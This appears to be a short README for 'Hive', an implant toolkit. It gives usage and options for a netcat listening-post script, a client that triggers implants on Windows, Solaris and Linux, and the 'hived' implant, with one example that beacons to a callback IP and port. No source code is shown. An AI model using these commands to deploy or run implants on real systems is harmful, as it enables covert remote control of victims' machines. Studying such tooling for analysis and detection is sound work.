# Hive Project

---

## nc.sh
Scripted netcat listener to emulate a listening post until LP is set up.

Usage:
./nc.sh

---

## hclient
Hive client that works with Windows, Solaris, and Linux implants.

Usage:
./hclient-linux-dbg [-p port] 
./hclient-linux-dbg [-p port] [-t address] [-a address] [-P protocol] [-d delay]

Options:
- -p port      : Callback port
- -t address   : IP address of target
- -a address   : IP address of listener
- -P protocol  : Trigger protocol
- -d delay     : (Optional) delay between received trigger and callback
- -h          : Print this usage

Examples:
Coming soon!

---

## hived
Hive implant.

Usage:
./hived-solaris-sparc-dbg -a <ip address> -p <port>

Options:
- -a : Beacon IP address to callback to
- -p : Beacon port
- -I : Interface [required, only for Solaris, e.g. hme0, e1000g0]
- -d : Initial Beacon delay in milliseconds
- -i : Beacon interval in milliseconds
- -h : Print help

Example:
./hived-solaris-sparc-dbg -a 10.3.2.76 -p 9999 -i 100000 -I hme0

---
